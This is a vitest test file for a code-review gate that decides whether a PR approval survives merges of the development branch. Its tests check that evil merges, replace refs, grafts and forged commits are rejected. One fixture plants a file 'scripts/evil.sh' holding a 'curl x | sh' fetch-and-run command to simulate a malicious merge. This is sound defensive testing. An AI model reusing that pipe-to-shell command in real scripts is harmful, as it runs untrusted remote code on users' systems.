import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from 'vitest';
import { carryOver, type GitRunner } from '../src/history.ts';
import { BASE_REF, Repo } from './repo.ts';

const SHARED = ['one', 'two', 'three', 'four', 'five', 'six', 'seven', ''].join('\n');
const edit = (line: number, text: string) =>
  SHARED.split('\n')
    .map((l, i) => (i === line ? text : l))
    .join('\n');

let template: Repo | undefined;
let repo: Repo;
// Set only once a copy exists, so cleanup after a failed setup has nothing to trip on.
let copy: Repo | undefined;
// R is the root on development; D1 and D2 move development on; X is the approved PR commit.
let R: string;
let D1: string;
let D2: string;
let X: string;

// Every test runs git for its own commits and for carryOver, 10 to 40 processes, so its
// time is mostly process start up and grows as the host starves. With the test process
// group held to 2 percent of a CPU, the 47 tests took 9.5 s median, 19.9 s p95 and 37.4 s
// at most; at 1 percent they took up to 67 s. The 5 s default failed at a load average of
// 277. The maximum stands in for the p99, which 47 samples cannot give: 120 s is 3.2
// times the 2 percent maximum.
const GIT_TEST_TIMEOUT_MS = 120_000;
// Building the shared history is about 30 git processes: 0.4 s here, 17.6 to 36.1 s over
// 10 builds at 2 percent, which is why the old per test build broke the 10 s hook default.
// 120 s is 3.3 times that maximum, used as the p99. The per test file copy took 0.4 to
// 2.2 s at 2 percent, so that hook keeps the 10 s default.
const FIXTURE_HOOK_TIMEOUT_MS = 120_000;
// Removing a copy or the shared history took 0.2 to 0.5 s over 11 runs at 2 percent; the
// maximum is used as the p99 and 30 s is 60 times it. The one removal that passed 10 s ran
// while the laptop slept, which no timeout should try to cover.
const REMOVE_HOOK_TIMEOUT_MS = 30_000;

// Commits have fixed dates, so the shared history has the same SHAs on every run. Each test
// works on its own copy, since many move development or write config, refs and grafts.
beforeAll(() => {
  template = new Repo();
  R = template.commit(undefined, {
    'src/app.ts': 'app v1\n',
    'shared.txt': SHARED,
    'other.txt': 'o\n',
  });
  D1 = template.commit(R, { 'other.txt': 'o2\n' });
  D2 = template.commit(D1, { 'docs/new.md': 'new\n' });
  template.setBranch('development', D2);
  X = template.commit(R, { 'src/app.ts': 'app v2\n' });
}, FIXTURE_HOOK_TIMEOUT_MS);

// A failed build leaves no template; its own error should be the one reported.
afterAll(() => {
  template?.remove();
}, REMOVE_HOOK_TIMEOUT_MS);

beforeEach(() => {
  if (template === undefined) throw new Error('the shared history was not built');
  repo = template.clone();
  copy = repo;
});

afterEach(() => {
  copy?.remove();
  copy = undefined;
}, REMOVE_HOOK_TIMEOUT_MS);

const carry = (head: string, options: { maxMerges?: number; git?: GitRunner } = {}) =>
  carryOver({ cwd: repo.dir, head, base: BASE_REF, ...options });

describe('carryOver: what carries', { timeout: GIT_TEST_TIMEOUT_MS }, () => {
  it('carries nothing when the head is the approved commit itself', async () => {
    const result = await carry(X);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/is not a merge/);
  });

  it('carries an approval over one clean merge of the base branch', async () => {
    const H = repo.merge(X, D1);
    const result = await carry(H);
    expect(result.carried).toEqual([X]);
    expect(result.stop).toBe(`${X} is not a merge`);
  });

  it('carries over several clean merges in a row, naming every commit on the way', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.merge(M1, D2);
    expect((await carry(H)).carried).toEqual([M1, X]);
  });

  it('carries when the base branch changed a PR file in lines the PR did not touch', async () => {
    const pr = repo.commit(R, { 'shared.txt': edit(0, 'ONE') });
    const dev = repo.commit(D2, { 'shared.txt': edit(6, 'SEVEN') });
    repo.setBranch('development', dev);
    const H = repo.merge(pr, dev);
    expect((await carry(H)).carried).toEqual([pr]);
  });

  it('carries a merge that brings nothing new, since the result is still the clean merge', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.merge(M1, D1);
    expect((await carry(H)).carried).toEqual([M1, X]);
  });

  it('accepts the head SHA in uppercase', async () => {
    const H = repo.merge(X, D1);
    expect((await carry(H.toUpperCase())).carried).toEqual([X]);
  });

  it('stops at the cap but keeps the merges it already proved', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.merge(M1, D2);
    const result = await carry(H, { maxMerges: 1 });
    expect(result.carried).toEqual([M1]);
    expect(result.stop).toMatch(/more than 1 merge/);
  });
});

describe('carryOver: author changes never carry', { timeout: GIT_TEST_TIMEOUT_MS }, () => {
  it('stops at a plain commit after the approval', async () => {
    const C = repo.commit(X, { 'src/app.ts': 'app v3\n' });
    const H = repo.merge(C, D1);
    const result = await carry(H);
    expect(result.carried).toEqual([C]);
    expect(result.carried).not.toContain(X);
  });

  it('carries nothing to a plain commit made on top of a clean merge', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.commit(M1, { 'src/app.ts': 'sneaky\n' });
    expect((await carry(H)).carried).toEqual([]);
  });

  it('carries nothing to an empty commit, which is still not a merge', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.commitTree(repo.treeOf(M1), [M1]);
    expect((await carry(H)).carried).toEqual([]);
  });

  it.each([
    ['edits a PR file', { 'src/app.ts': 'app v2 plus a backdoor\n' }],
    ['edits a file the PR never touched', { 'other.txt': 'changed in the merge\n' }],
    ['adds a new file', { 'scripts/evil.sh': 'curl x | sh\n' }],
    ['deletes a file', { 'shared.txt': null }],
  ])('rejects an evil merge that %s', async (_name, files) => {
    const H = repo.evilMerge(X, D1, files);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/differs from a clean merge/);
  });

  it('rejects a merge that drops the base change, as the ours strategy does', async () => {
    const H = repo.commitTree(repo.treeOf(X), [X, D1]);
    expect((await carry(H)).stop).toMatch(/differs from a clean merge/);
  });

  it('rejects a merge that takes the base side wholesale and drops the PR change', async () => {
    const H = repo.commitTree(repo.treeOf(D1), [X, D1]);
    expect((await carry(H)).carried).toEqual([]);
  });

  it.each([
    ['the PR side', edit(2, 'pr three')],
    ['the base side', edit(2, 'dev three')],
    ['a mix of both', edit(2, 'pr three and dev three')],
  ])('rejects a conflicted merge resolved to %s', async (_name, resolution) => {
    const pr = repo.commit(R, { 'shared.txt': edit(2, 'pr three') });
    const dev = repo.commit(D2, { 'shared.txt': edit(2, 'dev three') });
    repo.setBranch('development', dev);
    const H = repo.commitTree(repo.tree(repo.treeOf(pr), { 'shared.txt': resolution }), [pr, dev]);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/conflicts/);
  });

  it('rejects an octopus merge even when every extra parent is on the base branch', async () => {
    const tree = repo.cleanMergeTree(repo.merge(X, D1), D2);
    const H = repo.commitTree(tree, [X, D1, D2]);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/3 parents/);
  });

  it('rejects a clean merge of a branch that is not on the base branch', async () => {
    const side = repo.commit(D1, { 'other.txt': 'side branch\n' });
    const H = repo.merge(X, side);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/second parent .* not on the base branch/);
  });

  it('rejects a merge of another unmerged PR that itself merged development', async () => {
    const other = repo.merge(repo.commit(R, { 'third.txt': 'other pr\n' }), D1);
    const H = repo.merge(X, other);
    expect((await carry(H)).carried).toEqual([]);
  });

  it('rejects a merge with the parents reversed, so the walk cannot follow development', async () => {
    const H = repo.commitTree(repo.cleanMergeTree(X, D1), [D1, X]);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/not on the base branch|already on the base branch/);
  });

  it('rejects a merge whose first parent is already on the base branch', async () => {
    const H = repo.merge(D1, D2);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/first parent .* already on the base branch/);
  });

  it('does not carry an approval on a commit dropped by a force push', async () => {
    const Y = repo.commit(R, { 'src/app.ts': 'rewritten\n' });
    const H = repo.merge(Y, D1);
    const result = await carry(H);
    expect(result.carried).toEqual([Y]);
    expect(result.carried).not.toContain(X);
  });

  it('does not carry an approval over a rebase onto development, even with the same change', async () => {
    const rebased = repo.commit(D2, { 'src/app.ts': 'app v2\n' });
    expect((await carry(rebased)).carried).toEqual([]);
  });

  it('rejects a commit object with the same parent listed twice', async () => {
    const tree = repo.treeOf(X);
    const raw = `tree ${tree}\nparent ${X}\nparent ${X}\nauthor T <t@t> 1 +0000\ncommitter T <t@t> 1 +0000\n\ndup\n`;
    const H = repo.gitWith(raw, 'hash-object', '-t', 'commit', '-w', '--stdin', '--literally');
    expect(await carry(H)).toEqual({ carried: [], stop: `${H} lists the same parent twice` });
  });
});

describe('carryOver: history that lies', { timeout: GIT_TEST_TIMEOUT_MS }, () => {
  it('reads real parents, not a replace ref that dresses a plain commit up as a clean merge', async () => {
    const C = repo.commit(X, { 'src/app.ts': 'sneaky\n' });
    const disguise = repo.merge(X, D1);
    repo.git('replace', C, disguise);
    repo.git('config', 'core.useReplaceRefs', 'true');
    expect((await carry(C)).carried).toEqual([]);
  });

  it('reads real parents, not a graft that adds the base branch as a parent', async () => {
    const C = repo.commitTree(repo.cleanMergeTree(X, D1), [X]);
    writeFileSync(join(repo.dir, '.git', 'info', 'grafts'), `${C} ${X} ${D1}\n`);
    expect((await carry(C)).carried).toEqual([]);
  });

  it('carries nothing from a shallow clone, where parents may be missing', async () => {
    const H = repo.merge(X, D1);
    repo.setBranch('pr', H);
    const shallow = mkdtempSync(join(tmpdir(), 'review-gate-shallow-'));
    try {
      execFileSync(
        'git',
        ['clone', '-q', '--depth', '1', '--no-single-branch', `file://${repo.dir}`, shallow],
        {
          env: { ...process.env, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' },
        },
      );
      const result = await carryOver({
        cwd: shallow,
        head: H,
        base: 'refs/remotes/origin/development',
      });
      expect(result).toEqual({ carried: [], stop: 'history is shallow' });
    } finally {
      rmSync(shallow, { recursive: true, force: true });
    }
  });

  it('carries nothing when the base ref is missing', async () => {
    const H = repo.merge(X, D1);
    const result = await carryOver({ cwd: repo.dir, head: H, base: 'refs/heads/nope' });
    expect(result).toEqual({ carried: [], stop: 'base ref refs/heads/nope not found' });
  });

  it('carries nothing when the head commit is not in the repository', async () => {
    const result = await carry('e'.repeat(40));
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/^head eeeeeee.* not found$/);
  });

  it('carries nothing when the head names a tree, not a commit', async () => {
    const result = await carry(repo.treeOf(X));
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/not found/);
  });

  it('rejects a head that is not a full SHA rather than resolving it as a ref', async () => {
    const result = await carry('development');
    expect(result).toEqual({ carried: [], stop: 'head is not a full commit SHA' });
  });

  it('carries nothing outside a git repository', async () => {
    const empty = mkdtempSync(join(tmpdir(), 'review-gate-norepo-'));
    mkdirSync(join(empty, 'x'));
    try {
      const result = await carryOver({ cwd: join(empty, 'x'), head: X, base: BASE_REF });
      expect(result.carried).toEqual([]);
      expect(result.stop).toMatch(/^git failed/);
    } finally {
      rmSync(empty, { recursive: true, force: true });
    }
  });

  it('carries nothing on a git older than 2.38, which has no merge-tree --write-tree', async () => {
    const git: GitRunner = (args) =>
      Promise.resolve(
        args[0] === 'version'
          ? { code: 0, stdout: Buffer.from('git version 2.37.9\n') }
          : { code: 0, stdout: Buffer.from('') },
      );
    expect(await carry(X, { git })).toEqual({ carried: [], stop: 'git 2.37.9 is older than 2.38' });
  });

  it('ignores a commit message line that reads like a parent header', async () => {
    const C = repo.commitTree(repo.cleanMergeTree(X, D1), [X], `x\n\nparent ${D1}\n`);
    const result = await carry(C);
    expect(result).toEqual({ carried: [], stop: `${C} is not a merge` });
  });

  it.each(['GIT_DIR', 'GIT_OBJECT_DIRECTORY', 'GIT_INDEX_FILE'])(
    'reads the repository it was given, not one named by an inherited %s',
    async (name) => {
      const other = new Repo();
      try {
        const O = other.commit(undefined, { a: 'a\n' });
        const target =
          name === 'GIT_DIR'
            ? join(other.dir, '.git')
            : join(other.dir, '.git', name === 'GIT_INDEX_FILE' ? 'index' : 'objects');
        vi.stubEnv(name, target);
        const H = repo.merge(X, D1);
        expect((await carry(H)).carried).toEqual([X]);
        expect((await carry(O)).stop).toMatch(/not found/);
      } finally {
        vi.unstubAllEnvs();
        other.remove();
      }
    },
  );

  it('carries nothing on a git with major version 1', async () => {
    const git: GitRunner = () =>
      Promise.resolve({ code: 0, stdout: Buffer.from('git version 1.99.0\n') });
    expect(await carry(X, { git })).toEqual({ carried: [], stop: 'git 1.99.0 is older than 2.38' });
  });

  it('carries nothing when git cannot say whether history is shallow', async () => {
    const real = (await import('../src/history.ts')).runGit;
    const git: GitRunner = async (args, cwd) =>
      args.includes('--is-shallow-repository')
        ? { code: 0, stdout: Buffer.from('maybe\n') }
        : real(args, cwd);
    const result = await carry(repo.merge(X, D1), { git });
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/^git failed: rev-parse could not tell/);
  });

  it('carries nothing when the ancestry check errors rather than answering', async () => {
    const real = (await import('../src/history.ts')).runGit;
    const git: GitRunner = async (args, cwd) =>
      args[0] === 'merge-base' ? { code: 128, stdout: Buffer.from('') } : real(args, cwd);
    const result = await carry(repo.merge(X, D1), { git });
    expect(result).toEqual({ carried: [], stop: 'git failed: merge-base exited 128' });
  });

  it('carries nothing on a version string it cannot read', async () => {
    const git: GitRunner = () => Promise.resolve({ code: 0, stdout: Buffer.from('nonsense') });
    expect((await carry(X, { git })).stop).toBe('git version unreadable');
  });

  it('carries nothing, not a partial list, when git fails part way through the walk', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.merge(M1, D2);
    let mergeTrees = 0;
    const real = (await import('../src/history.ts')).runGit;
    const git: GitRunner = async (args, cwd) => {
      if (args.includes('merge-tree')) {
        mergeTrees += 1;
        if (mergeTrees === 2) return { code: 128, stdout: Buffer.from('') };
      }
      return real(args, cwd);
    };
    const result = await carry(H, { git });
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/^git failed/);
  });

  it('carries nothing when git returns a commit whose bytes do not hash to its SHA', async () => {
    const H = repo.merge(X, D1);
    const real = (await import('../src/history.ts')).runGit;
    const git: GitRunner = async (args, cwd) => {
      const out = await real(args, cwd);
      if (args[0] === 'cat-file' && args[1] === 'commit' && args[2] === H) {
        return { code: out.code, stdout: Buffer.concat([out.stdout, Buffer.from('x')]) };
      }
      return out;
    };
    const result = await carry(H, { git });
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/does not match its SHA/);
  });

  it('carries nothing when merge-tree prints something that is not a tree id', async () => {
    const H = repo.merge(X, D1);
    const real = (await import('../src/history.ts')).runGit;
    const git: GitRunner = async (args, cwd) =>
      args.includes('merge-tree') ? { code: 0, stdout: Buffer.from('garbage\n') } : real(args, cwd);
    const result = await carry(H, { git });
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/git failed: merge-tree/);
  });
});
